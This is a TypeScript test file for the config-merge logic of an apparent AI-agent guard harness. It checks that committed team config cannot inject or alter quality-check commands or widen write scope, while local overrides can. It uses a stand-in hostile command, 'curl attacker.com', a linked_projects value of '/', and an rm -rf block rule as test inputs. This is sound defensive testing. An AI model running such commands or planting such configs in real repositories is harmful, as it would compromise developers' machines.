import assert from "node:assert/strict";
import { describe, expect, it } from "vitest";
import { nonNull } from "../../../lib/non-null.js";
import type { GuardRulesConfig, QualityCheckConfig } from "../../types.js";
import type { ContentScannerOverrides } from "../config-overrides.js";
import { DEFAULT_CONFIG } from "../default-config.js";
import { mergeLocalOverrides, mergeTeamRules, postureEnumViolationsIn } from "../merge.js";

function mkBaseConfig() {
	// Use the full default config (deep-cloned) as the starting shape so we
	// satisfy all required fields without listing them inline in every test.
	return structuredClone(DEFAULT_CONFIG);
}

/**
 * Remove a property without triggering TS control-flow narrowing. A literal
 * `delete obj.k` narrows `obj.k` to `undefined` for the rest of the block, so
 * a subsequent read (after a merge call TS can't see mutates `obj`) collapses
 * to `never`. `Reflect.deleteProperty` is opaque to the flow analyzer, so the
 * property keeps its declared optional type and the "base lacks it" branches
 * stay readable. Returns void; mutates in place.
 */
function clearProp<T extends object>(obj: T, key: keyof T): void {
	Reflect.deleteProperty(obj, key);
}

describe("mergeTeamRules", () => {
	it("keeps invalid safe-field values out while applying a valid sibling toggle", () => {
		const config = mkBaseConfig();
		const before = structuredClone(nonNull(config.quality_checks.typescript));
		mergeTeamRules(config, { quality_checks: { typescript: {
			enabled: false, file_types: [".ts", 7], timeout_ms: "fast", severity: "block", description: 9,
		} } });
		expect(config.quality_checks.typescript).toEqual({ ...before, enabled: false });
	});

	for (const [name, merge] of [["team", mergeTeamRules], ["local", mergeLocalOverrides]] as const) {
		it(`restores a complete missing section only when the ${name} override supplies it`, () => {
			const config = mkBaseConfig();
			clearProp(config, "per_edit_coverage");
			merge(config, {});
			expect(config.per_edit_coverage).toBeUndefined();
			merge(config, { per_edit_coverage: { enabled: false } });
			expect(config.per_edit_coverage).toEqual({ ...DEFAULT_CONFIG.per_edit_coverage, enabled: false });
			expect(config.per_edit_coverage?.languages).not.toBe(DEFAULT_CONFIG.per_edit_coverage?.languages);
		});
	}

	it("blocks team config from adding new quality-check command (safe-field enforcement)", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, {
			quality_checks: {
				malicious_new: {
					command: "curl attacker.com",
					enabled: true,
					file_types: [".ts"],
					timeout_ms: 1,
					severity: "error",
				},
			},
		});
		// Team cannot add new check entries
		expect(config.quality_checks.malicious_new).toBeUndefined();
	});

	it("blocks team config from changing `command` field on existing checks", () => {
		const config = mkBaseConfig();
		const originalCommand = nonNull(config.quality_checks.typescript).command;
		mergeTeamRules(config, {
			quality_checks: {
				typescript: {
					command: "curl attacker.com",
					enabled: true,
					file_types: [".ts"],
					timeout_ms: 1,
					severity: "error",
				},
			},
		});
		expect(nonNull(config.quality_checks.typescript).command).toBe(originalCommand);
	});

	it("allows team config to toggle safe fields (enabled, severity, timeout)", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, {
			quality_checks: {
				typescript: {
					enabled: false,
					severity: "warning",
					timeout_ms: 1000,
					file_types: [".ts"],
				},
			},
		});
		expect(nonNull(config.quality_checks.typescript).enabled).toBe(false);
		expect(nonNull(config.quality_checks.typescript).severity).toBe("warning");
		expect(nonNull(config.quality_checks.typescript).timeout_ms).toBe(1000);
	});

	it("applies team-level protected_files and rules", () => {
		const config = mkBaseConfig();
		config.protected_files = [];
		mergeTeamRules(config, {
			protected_files: [{ glob: "**/foo", operations: ["Write"], reason: "r" }],
		});
		expect(config.protected_files.length).toBe(1);
		expect(nonNull(config.protected_files[0]).glob).toBe("**/foo");
	});

	it("can disable the harness entirely via team config", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, { enabled: false });
		expect(config.enabled).toBe(false);
	});

	it("does NOT let committed team config widen write scope via linked_projects", () => {
		// Security invariant: linked_projects feeds the repo-confinement
		// allowlist (extra writable roots), so it must never be settable from
		// git-committed team config — a malicious PR adding
		// `linked_projects: ["/"]` would hand every developer's agent the whole
		// filesystem. Only mergeLocalOverrides honors it (the user's own machine).
		const config = mkBaseConfig();
		mergeTeamRules(config, { linked_projects: ["/"] });
		expect(config.linked_projects).toEqual([]);
	});

	it("team config can enable grep_acceleration substitution", () => {
		// Regression: the flag pre-tool-pipeline reads
		// (grep_acceleration.substitution_enabled) was dropped by both merge
		// functions, so the documented re-enable path was a silent no-op.
		const config = mkBaseConfig();
		mergeTeamRules(config, { grep_acceleration: { substitution_enabled: true } });
		expect(config.grep_acceleration?.substitution_enabled).toBe(true);
	});

	it("replaces the entire rules array from team config", () => {
		const config = mkBaseConfig();
		const before = config.rules.length;
		const teamRule: GuardRulesConfig["rules"][number] = {
			id: "team-only",
			enabled: true,
			trigger: "PreToolUse",
			tool_match: ["Bash"],
			category: "destructive",
			patterns: [{ field: "command", regex: "danger" }],
			action: "block",
			severity: "high",
			reason: "team rule fired",
		};
		mergeTeamRules(config, { rules: [teamRule] });
		expect(config.rules).toHaveLength(1);
		expect(config.rules).not.toHaveLength(before);
		expect(nonNull(config.rules[0]).id).toBe("team-only");
	});

	it("does NOT clobber enabled when team.enabled is true (only false disables)", () => {
		// The branch is `if (team.enabled === false)` — a `true` must be a no-op,
		// not flip an already-disabled harness back on.
		const config = mkBaseConfig();
		config.enabled = false;
		mergeTeamRules(config, { enabled: true });
		expect(config.enabled).toBe(false);
	});

	it("replaces file_reminders wholesale from team config (not appended)", () => {
		// mergeTeamRules assigns file_reminders directly (unlike the local merge,
		// which appends). Two distinct code paths — pin the team one.
		const config = mkBaseConfig();
		config.file_reminders = [{ glob: "**/old", message: "old" }];
		mergeTeamRules(config, {
			file_reminders: [{ glob: "**/new", message: "new" }],
		});
		expect(config.file_reminders).toHaveLength(1);
		expect(nonNull(config.file_reminders[0]).glob).toBe("**/new");
	});

	it("deep-merges curl_mcp_detection (Object.assign keeps untouched fields)", () => {
		const config = mkBaseConfig();
		const originalMessage = config.curl_mcp_detection.message;
		mergeTeamRules(config, {
			curl_mcp_detection: {
				escalate_after: 99,
			},
		});
		expect(config.curl_mcp_detection.escalate_after).toBe(99);
		// Object.assign leaves the unspecified `message` field intact.
		expect(config.curl_mcp_detection.message).toBe(originalMessage);
	});

	it("ignores a non-object quality-check override (null / primitive)", () => {
		// Guard: `if (!teamCheck || typeof teamCheck !== "object") continue`.
		// A malformed team entry must not throw and must leave the existing
		// check untouched.
		const config = mkBaseConfig();
		const before = nonNull(config.quality_checks.typescript).enabled;
		mergeTeamRules(config, {
			quality_checks: {
				typescript: null,
			},
		});
		expect(nonNull(config.quality_checks.typescript).enabled).toBe(before);
	});

	it("skips an explicitly-undefined safe field rather than writing undefined", () => {
		// Guard: `if (val !== undefined)`. Passing `{enabled: undefined}` for an
		// existing check must NOT overwrite the real value with undefined.
		const config = mkBaseConfig();
		nonNull(config.quality_checks.typescript).enabled = true;
		mergeTeamRules(config, {
			quality_checks: {
				typescript: {
					enabled: undefined,
				},
			},
		});
		expect(nonNull(config.quality_checks.typescript).enabled).toBe(true);
	});

	it("merges team error_memory via Object.assign", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, {
			error_memory: { max_records: 42 },
		});
		expect(config.error_memory.max_records).toBe(42);
		// Untouched fields survive the assign.
		expect(config.error_memory.enabled).toBe(mkBaseConfig().error_memory.enabled);
	});

	it("applies team project_specific protected paths", () => {
		const config = mkBaseConfig();
		mergeTeamRules(config, {
			project_specific: { protected_paths: ["secrets/"], protected_reason: "infra" },
		});
		expect(config.project_specific?.protected_paths).toEqual(["secrets/"]);
		expect(config.project_specific?.protected_reason).toBe("infra");
	});

	it("applies team policy_classifier config", () => {
		const config = mkBaseConfig();
		const classifier: NonNullable<GuardRulesConfig["policy_classifier"]> = {
			enabled: true,
			mode: "shadow",
			provider: "groq",
			endpoint: "https://example.com/v1",
			api_key_env: "FAKE_KEY",
			model: "vendor-model-v6",
			timeout_ms: 3000,
			max_input_tokens: 800, confidence_threshold: 0.8, max_calls_per_session: 50,
		};
		mergeTeamRules(config, { policy_classifier: classifier });
		expect(config.policy_classifier?.enabled).toBe(true);
		expect(config.policy_classifier?.model).toBe("vendor-model-v6");
	});

	it("applies team auto_coordination config", () => {
		const config = mkBaseConfig();
		const ac: NonNullable<GuardRulesConfig["auto_coordination"]> = {
			enabled: true,
			check_interval: 7,
			min_interval_ms: 1,
			max_interval_ms: 2,
			timeout_ms: 100,
			skip_tools: ["Read"],
			urgent_importance: "high", max_misses_before_disable: 5,
		};
		mergeTeamRules(config, { auto_coordination: ac });
		expect(config.auto_coordination?.enabled).toBe(true);
		expect(config.auto_coordination?.check_interval).toBe(7);
	});

	it("merges team project_wide_checks when config already has the block", () => {
		const config = mkBaseConfig();
		// DEFAULT_CONFIG ships project_wide_checks, so the `&& config.project_wide_checks`
		// guard is satisfied and Object.assign runs.
		assert(config.project_wide_checks, "fixture must ship project_wide_checks");
		mergeTeamRules(config, {
			project_wide_checks: {
				edit_interval: 13,
			},
		});
		expect(config.project_wide_checks?.edit_interval).toBe(13);
		// Object.assign preserves the rest of the block.
		expect(config.project_wide_checks?.enabled).toBe(
			mkBaseConfig().project_wide_checks?.enabled,
		);
	});

	it("restores project-wide defaults before applying a team override to a missing section", () => {
		// Guard: `if (team.project_wide_checks && config.project_wide_checks)`.
		// With the base block deleted, a team override must be dropped (no
		// Object.assign onto undefined).
		const config = mkBaseConfig();
		clearProp(config, "project_wide_checks");
		mergeTeamRules(config, {
			project_wide_checks: {
				edit_interval: 13,
			},
		});
		expect(config.project_wide_checks).toEqual({ ...DEFAULT_CONFIG.project_wide_checks, edit_interval: 13 });
	});

	it("is a no-op when team config is empty", () => {
		// Every top-level `if` is false → nothing changes. Exercises the
		// all-branches-skipped path cleanly.
		const config = mkBaseConfig();
		const snapshot = JSON.stringify(config);
		mergeTeamRules(config, {});
		expect(JSON.stringify(config)).toBe(snapshot);
	});
});

describe("mergeLocalOverrides", () => {
	it("appends file_reminders rather than replacing them", () => {
		const config = mkBaseConfig();
		config.file_reminders = [{ glob: "**/a", message: "A" }];
		mergeLocalOverrides(config, {
			file_reminders: [{ glob: "**/b", message: "B" }],
		});
		expect(config.file_reminders.length).toBe(2);
	});

	it("local overrides can set disabled_rules", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { disabled_rules: ["builtin-rm-rf-root"] });
		expect(config.disabled_rules).toEqual(["builtin-rm-rf-root"]);
	});

	it("local overrides CAN change quality_checks.command (trusted scope)", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, {
			quality_checks: {
				typescript: {
					command: "my-custom-tsc",
					enabled: true,
					file_types: [".ts"],
					timeout_ms: 1,
					severity: "error",
				},
			},
		});
		expect(nonNull(config.quality_checks.typescript).command).toBe("my-custom-tsc");
	});

	it("appends content_scanner.allowlist entries instead of replacing them", () => {
		// Locals must add to the curated default allowlist, not wipe it.
		// Otherwise a single user adding `noreply@my-company.com` would lose
		// every team-shipped FP suppression.
		const config = mkBaseConfig();
		const defaultLen = config.content_scanner?.allowlist?.length ?? 0;
		mergeLocalOverrides(config, {
			content_scanner: {
				allowlist: [
					{ kind: "exact", pattern: "noreply@my-company.com", label: "private_email" },
				],
			},
		});
		expect(config.content_scanner?.allowlist?.length).toBe(defaultLen + 1);
		const last = config.content_scanner?.allowlist?.[defaultLen];
		expect(last?.kind).toBe("exact");
	});

	it("preserves nested local config when allowlist is the only override", () => {
		// Regression for the deep-merge fix: a partial override like
		// {content_scanner: {allowlist: [...]}} must NOT wipe local.python_bin
		// or other defaults inside the local block.
		const config = mkBaseConfig();
		const defaultPythonBin = config.content_scanner?.local.python_bin;
		mergeLocalOverrides(config, {
			content_scanner: {
				allowlist: [{ kind: "exact", pattern: "x", label: "private_email" }],
			},
		});
		expect(config.content_scanner?.local.python_bin).toBe(defaultPythonBin);
	});

	it("appends content_scanner.disabled_labels entries instead of replacing them", () => {
		// Mirror the allowlist convention: locals add to (or seed) the disabled-
		// labels list, never replace. Stops a single user-side kill switch from
		// silently undoing a team-wide suppression.
		const config = mkBaseConfig();
		const defaults = config.content_scanner?.disabled_labels ?? [];
		mergeLocalOverrides(config, {
			content_scanner: {
				disabled_labels: ["private_url"],
			},
		});
		const merged = config.content_scanner?.disabled_labels ?? [];
		expect(merged).toContain("private_url");
		for (const def of defaults) expect(merged).toContain(def);
	});

	it("dedupes disabled_labels across default and local layers", () => {
		// If a default already disables `private_url` and a local config also
		// names it, the merged list must contain `private_url` once — not
		// duplicated. Duplicates would break Set-based audits and inflate any
		// `harness status`-style readout of disabled categories.
		const config = mkBaseConfig();
		const cs = config.content_scanner;
		// node:assert narrows `cs` to non-null without needing a control-flow
		// branch (which the harness flags as hidden control flow inside a
		// test body) or a `!` non-null assertion (which would need a
		// suppression). Throws AssertionError on a missing fixture.
		assert(cs, "test fixture must include content_scanner");
		cs.disabled_labels = ["private_url"];
		mergeLocalOverrides(config, {
			content_scanner: {
				disabled_labels: ["private_url", "private_address"],
			},
		});
		const merged = config.content_scanner?.disabled_labels ?? [];
		expect(merged.sort()).toEqual(["private_address", "private_url"]);
	});

	it("local overrides can declare linked_projects (multi-repo write scope)", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { linked_projects: ["../interlinked-cloud"] });
		expect(config.linked_projects).toEqual(["../interlinked-cloud"]);
	});

	it("leaves linked_projects at its default when the local override omits it", () => {
		// The passthrough is guarded by `if (local.linked_projects)`; an
		// unconditional assignment would clobber the default [] to undefined and
		// break the `rules.linked_projects || []` call site in pre-tool.ts.
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { disabled_rules: ["x"] });
		expect(config.linked_projects).toEqual([]);
	});

	it("local override can enable grep_acceleration substitution (personal re-enable path)", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, { grep_acceleration: { substitution_enabled: true } });
		expect(config.grep_acceleration?.substitution_enabled).toBe(true);
	});

	it("local overrides can set extra_exceptions", () => {
		const config = mkBaseConfig();
		mergeLocalOverrides(config, {
			extra_exceptions: { "builtin-rm-rf-root": ["rm -rf node_modules"] },
		});
		expect(config.extra_exceptions).toEqual({
			"builtin-rm-rf-root": ["rm -rf node_modules"],
		});
	});

	it("local overrides Object.assign onto an EXISTING quality check (preserves other fields)", () => {
		// Branch: `if (config.quality_checks[key]) Object.assign(...)`. Only the
		// supplied field changes; command and the rest survive.
		const config = mkBaseConfig();
		const originalCommand = nonNull(config.quality_checks.typescript).command;
		mergeLocalOverrides(config, {
			quality_checks: {
				typescript: { enabled: false },
			},
		});
		expect(nonNull(config.quality_checks.typescript).enabled).toBe(false);
		// Object.assign of a partial keeps the existing command.
		expect(nonNull(config.quality_checks.typescript).command).toBe(originalCommand);
	});

	it("local overrides can ADD a brand-new quality check (trusted scope)", () => {
		// Branch: the `else` arm — `config.quality_checks[key] = check`. Unlike
		// team config, locals may introduce wholly new checks with a command.
		const config = mkBaseConfig();
		expect(config.quality_checks.my_local_check).toBeUndefined();
		const newCheck: QualityCheckConfig = {
			enabled: true,
			command: "my-local-linter",
			file_types: [".ts"],
			timeout_ms: 5000,
			severity: "warning",
		};
		mergeLocalOverrides(config, { quality_checks: { my_local_check: newCheck } });
		expect(config.quality_checks.my_local_check).toBeDefined();
		expect(config.quality_checks.my_local_check?.command).toBe("my-local-linter");
	});

	it("local overrides merge project_wide_checks when the base has the block", () => {
		const config = mkBaseConfig();
		assert(config.project_wide_checks, "fixture must ship project_wide_checks");
		mergeLocalOverrides(config, {
			project_wide_checks: {
				timeout_ms: 12345,
			},
		});
		expect(config.project_wide_checks?.timeout_ms).toBe(12345);
	});

	it("restores project-wide defaults before applying a local override to a missing section", () => {
		// Guard: `if (local.project_wide_checks && config.project_wide_checks)`.
		const config = mkBaseConfig();
		clearProp(config, "project_wide_checks");
		mergeLocalOverrides(config, {
			project_wide_checks: {
				timeout_ms: 12345,
			},
		});
		expect(config.project_wide_checks).toEqual({ ...DEFAULT_CONFIG.project_wide_checks, timeout_ms: 12345 });
	});

	it("local override deep-merges into an EXISTING content_scanner block", () => {
		// Branch: `if (config.content_scanner) mergeContentScanner(...)`.
		// DEFAULT_CONFIG ships content_scanner, so the deep-merge path runs.
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		expect(config.content_scanner.enabled).toBe(false);
		mergeLocalOverrides(config, {
			content_scanner: {
				enabled: true,
			},
		});
		expect(config.content_scanner?.enabled).toBe(true);
	});

	it("restores scanner defaults before applying a partial override to a missing section", () => {
		// Branch: the `else` arm — `config.content_scanner = local.content_scanner`.
		const config = mkBaseConfig();
		clearProp(config, "content_scanner");
		const fresh: ContentScannerOverrides = {
			enabled: true,
			runtime: "huggingface",
		};
		mergeLocalOverrides(config, { content_scanner: fresh });
		expect(config.content_scanner).toEqual({ ...DEFAULT_CONFIG.content_scanner, ...fresh });
		expect(config.content_scanner?.runtime).toBe("huggingface");
	});

	it("local override merges structural_checks via Object.assign", () => {
		const config = mkBaseConfig();
		config.structural_checks.enabled = true;
		mergeLocalOverrides(config, {
			structural_checks: {
				enabled: false,
			},
		});
		expect(config.structural_checks.enabled).toBe(false);
		// Object.assign keeps sibling fields.
		expect(config.structural_checks.export_surface).toBe(
			mkBaseConfig().structural_checks.export_surface,
		);
	});

	it("local override merges plan_capture onto an existing block", () => {
		// Branch: `if (config.plan_capture) Object.assign(...)`. DEFAULT_CONFIG
		// omits plan_capture, so seed it first to hit the `if` arm.
		const config = mkBaseConfig();
		config.plan_capture = { enabled: false, parse_userprompt: false };
		mergeLocalOverrides(config, {
			plan_capture: { enabled: true },
		});
		expect(config.plan_capture?.enabled).toBe(true);
		// parse_userprompt survives the partial assign.
		expect(config.plan_capture?.parse_userprompt).toBe(false);
	});

	it("creates plan_capture from a supplied override when the base lacks it", () => {
		// Branch: the `else` arm. DEFAULT_CONFIG has no plan_capture by default.
		const config = mkBaseConfig();
		expect(config.plan_capture).toBeUndefined();
		const pc = { enabled: true, parse_userprompt: true };
		mergeLocalOverrides(config, { plan_capture: pc });
		expect(config.plan_capture).toEqual(pc);
		expect(config.plan_capture?.enabled).toBe(true);
	});

	it("local override merges git_session_scope_gate onto an existing block", () => {
		// Branch: `if (config.git_session_scope_gate) Object.assign(...)`.
		const config = mkBaseConfig();
		config.git_session_scope_gate = { enabled: false, mode: "off" };
		mergeLocalOverrides(config, {
			git_session_scope_gate: {
				enabled: true,
			},
		});
		expect(config.git_session_scope_gate?.enabled).toBe(true);
		// mode survives the partial assign.
		expect(config.git_session_scope_gate?.mode).toBe("off");
	});

	it("creates git_session_scope_gate from a supplied override when the base lacks it", () => {
		// Branch: the `else` arm. DEFAULT_CONFIG omits the gate by default.
		const config = mkBaseConfig();
		expect(config.git_session_scope_gate).toBeUndefined();
		const gate = { enabled: true, mode: "ask" as const };
		mergeLocalOverrides(config, { git_session_scope_gate: gate });
		expect(config.git_session_scope_gate).toEqual(gate);
		expect(config.git_session_scope_gate?.mode).toBe("ask");
	});

	it("merges the documented per_edit_coverage opt-out onto the default-on block (finding 1)", () => {
		// THE documented opt-out: `{"per_edit_coverage": {"enabled": false}}` in
		// guard-rules.local.json. Without the merge branch it was silently dropped and
		// the default-on HARD GATES could not be disabled as advertised.
		const config = mkBaseConfig();
		config.per_edit_coverage = { ...structuredClone(nonNull(DEFAULT_CONFIG.per_edit_coverage)),
			enabled: true,
			mode: "block",
			budget_ms: 25_000,
			languages: ["js", "ts"],
		};
		mergeLocalOverrides(config, {
			per_edit_coverage: { enabled: false },
		});
		expect(config.per_edit_coverage?.enabled).toBe(false); // opt-out honored
		expect(config.per_edit_coverage?.mode).toBe("block"); // other knobs survive the partial
	});

	it("restores coverage defaults while preserving an explicit opt-out on a missing section", () => {
		const config = mkBaseConfig();
		clearProp(config, "per_edit_coverage");
		const pec = { enabled: false };
		mergeLocalOverrides(config, { per_edit_coverage: pec });
		expect(config.per_edit_coverage).toEqual({ ...DEFAULT_CONFIG.per_edit_coverage, ...pec });
	});

	it("merges a partial per_edit_mutation override onto the default block (found live 2026-07-02)", () => {
		// Same silently-dropped class as per_edit_coverage above: the dogfood flip
		// `{"per_edit_mutation": {"enabled": true, "runner_url": …}}` in
		// guard-rules.local.json left the daemon on pure defaults until the merge
		// branch existed.
		const config = mkBaseConfig();
		config.per_edit_mutation = { ...structuredClone(nonNull(DEFAULT_CONFIG.per_edit_mutation)),
			enabled: false,
			mode: "block",
			unavailable_behavior: "allow_unmeasured",
		};
		mergeLocalOverrides(config, {
			per_edit_mutation: { enabled: true, runner_url: "https://runner.example" },
		});
		expect(config.per_edit_mutation?.enabled).toBe(true); // flip honored
		expect(config.per_edit_mutation?.runner_url).toBe("https://runner.example");
		expect(config.per_edit_mutation?.mode).toBe("block"); // other knobs survive the partial
	});

	it("restores mutation defaults before applying an opt-in to a missing section", () => {
		const config = mkBaseConfig();
		clearProp(config, "per_edit_mutation");
		const pem = { enabled: true };
		mergeLocalOverrides(config, { per_edit_mutation: pem });
		expect(config.per_edit_mutation).toEqual({ ...DEFAULT_CONFIG.per_edit_mutation, ...pem });
	});

	it("is a no-op when local config is empty", () => {
		const config = mkBaseConfig();
		const snapshot = JSON.stringify(config);
		mergeLocalOverrides(config, {});
		expect(JSON.stringify(config)).toBe(snapshot);
	});
});

describe("mergeContentScanner (via mergeLocalOverrides deep-merge)", () => {
	it("overrides the scalar top-level knobs (enabled/runtime/min_score/max_scan_bytes)", () => {
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		mergeLocalOverrides(config, {
			content_scanner: {
				enabled: true,
				runtime: "custom_http",
				min_score: 0.75,
				max_scan_bytes: 9999,
			},
		});
		const cs = config.content_scanner;
		expect(cs?.enabled).toBe(true);
		expect(cs?.runtime).toBe("custom_http");
		expect(cs?.min_score).toBe(0.75);
		expect(cs?.max_scan_bytes).toBe(9999);
	});

	it("treats min_score: 0 as a real override (not skipped as falsy)", () => {
		// Guard is `!== undefined`, NOT truthiness — 0 is a legitimate value.
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		config.content_scanner.min_score = 5;
		mergeLocalOverrides(config, {
			content_scanner: { min_score: 0 },
		});
		expect(config.content_scanner?.min_score).toBe(0);
	});

	it("deep-merges the nested `local` block (preserves untouched leaf knobs)", () => {
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		const defaultPythonBin = config.content_scanner.local.python_bin;
		mergeLocalOverrides(config, {
			content_scanner: {
				local: { pool_size: 1 },
			},
		});
		expect(config.content_scanner?.local.pool_size).toBe(1);
		// Object.assign keeps the rest of the local block intact.
		expect(config.content_scanner?.local.python_bin).toBe(defaultPythonBin);
	});

	it("deep-merges the nested `huggingface` block", () => {
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		const defaultEnv = config.content_scanner.huggingface.api_key_env;
		mergeLocalOverrides(config, {
			content_scanner: {
				huggingface: { model: "vendor-model-v6" },
			},
		});
		expect(config.content_scanner?.huggingface.model).toBe("vendor-model-v6");
		expect(config.content_scanner?.huggingface.api_key_env).toBe(defaultEnv);
	});

	it("deep-merges the nested `custom_http` block", () => {
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		mergeLocalOverrides(config, {
			content_scanner: {
				custom_http: { endpoint: "https://scanner.example.com/v1" },
			},
		});
		expect(config.content_scanner?.custom_http.endpoint).toBe(
			"https://scanner.example.com/v1",
		);
		// timeout_ms is untouched by the partial assign.
		expect(config.content_scanner?.custom_http.timeout_ms).toBe(
			mkBaseConfig().content_scanner?.custom_http.timeout_ms,
		);
	});

	it("deep-merges the nested `scan_points` block", () => {
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		mergeLocalOverrides(config, {
			content_scanner: {
				scan_points: { bash_command: false },
			},
		});
		expect(config.content_scanner?.scan_points.bash_command).toBe(false);
		// The other scan points keep their defaults.
		expect(config.content_scanner?.scan_points.write_edit).toBe(true);
	});

	it("does NOT append when override.allowlist is an empty array (length-0 guard)", () => {
		// Guard: `if (override.allowlist && override.allowlist.length > 0)`. An
		// empty array must be a no-op, not wipe or grow the curated default list.
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		const before = config.content_scanner.allowlist?.length ?? 0;
		mergeLocalOverrides(config, {
			content_scanner: {
				allowlist: [],
			},
		});
		expect(config.content_scanner?.allowlist?.length).toBe(before);
	});

	it("seeds allowlist from undefined when the base has none (?? fallback)", () => {
		// Exercises the `target.allowlist ?? []` nullish branch — base list absent,
		// local supplies one.
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		clearProp(config.content_scanner, "allowlist");
		mergeLocalOverrides(config, {
			content_scanner: {
				allowlist: [{ kind: "exact", pattern: "x", label: "private_email" }],
			},
		});
		expect(config.content_scanner?.allowlist?.length).toBe(1);
		expect(config.content_scanner?.allowlist?.[0]?.kind).toBe("exact");
	});

	it("does NOT append when override.disabled_labels is an empty array", () => {
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		config.content_scanner.disabled_labels = ["private_url"];
		mergeLocalOverrides(config, {
			content_scanner: {
				disabled_labels: [],
			},
		});
		expect(config.content_scanner?.disabled_labels).toEqual(["private_url"]);
	});

	it("seeds disabled_labels from undefined when the base has none (?? fallback)", () => {
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		clearProp(config.content_scanner, "disabled_labels");
		mergeLocalOverrides(config, {
			content_scanner: {
				disabled_labels: ["private_url"],
			},
		});
		expect(config.content_scanner?.disabled_labels).toEqual(["private_url"]);
	});

	it("is a no-op deep-merge when the content_scanner override is empty", () => {
		// Every leaf `if` in mergeContentScanner is false → the existing block is
		// untouched. Confirms the all-skipped path doesn't throw or mutate.
		const config = mkBaseConfig();
		assert(config.content_scanner, "fixture must ship content_scanner");
		const snapshot = JSON.stringify(config.content_scanner);
		mergeLocalOverrides(config, {
			content_scanner: {},
		});
		expect(JSON.stringify(config.content_scanner)).toBe(snapshot);
	});
});

// `postureEnumViolationsIn` is handed a RAW parsed config section, so its
// argument is whatever the JSON file held — including the non-object shapes
// the type signature cannot rule out. Doctor calls it on exactly that value.
describe("postureEnumViolationsIn — non-object structural_checks sections", () => {
	it("distinguishes an absent setting from an explicitly invalid undefined value", () => {
		expect(postureEnumViolationsIn({})).toEqual([]);
		expect(postureEnumViolationsIn({ test_first_mode: undefined })).toEqual([
			{ field: "test_first_mode", value: "undefined" },
		]);
	});
	it("reports nothing for a missing (null) structural_checks section", () => {
		// Without the null guard the entry loop reaches Object.hasOwn(null, …)
		// and throws, so doctor would crash on a config that simply has no
		// structural_checks block.
		expect(postureEnumViolationsIn(null)).toEqual([]);
	});

	it("reports nothing for a scalar structural_checks value", () => {
		expect(postureEnumViolationsIn("enforce")).toEqual([]);
	});

	it("ignores an array section even when it carries an enum field as a property", () => {
		// The array clause is the load-bearing one here: an array IS an object,
		// so without it this returns a { field: "test_first_mode" } violation.
		const arraySection = Object.assign(["nudge"], { test_first_mode: "typo" });
		expect(postureEnumViolationsIn(arraySection)).toEqual([]);
	});
});
